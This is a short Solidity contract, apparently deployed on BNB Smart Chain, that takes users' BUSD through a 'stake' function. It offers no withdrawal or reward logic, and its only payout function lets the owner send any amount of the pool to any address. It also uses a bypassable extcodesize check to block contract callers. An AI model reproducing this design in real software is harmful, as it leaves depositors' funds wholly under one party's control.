/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract AadiProWeb3{
   
    BEP20 public busd = BEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    
    address owner;
    
    event Stake(address depositor, uint256 amount);
    event StakeDistribution(address receiver, uint256 amount);
   
    modifier onlyOwner(){
        require(msg.sender == owner,"You are not authorized owner.");
        _;
    }
    
    function getContractInfo() view public returns(uint256 contractBalance){
        return contractBalance = busd.balanceOf(address(this));
    }

    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
    }

    function stake(uint256 amount) public security{
        busd.transferFrom(msg.sender,address(this),amount);
        emit Stake(msg.sender, amount);
    }

    function stakeDistribution(address _address, uint _amount) external onlyOwner security{
        busd.transfer(_address,_amount);
        emit StakeDistribution(_address,_amount);
    }

}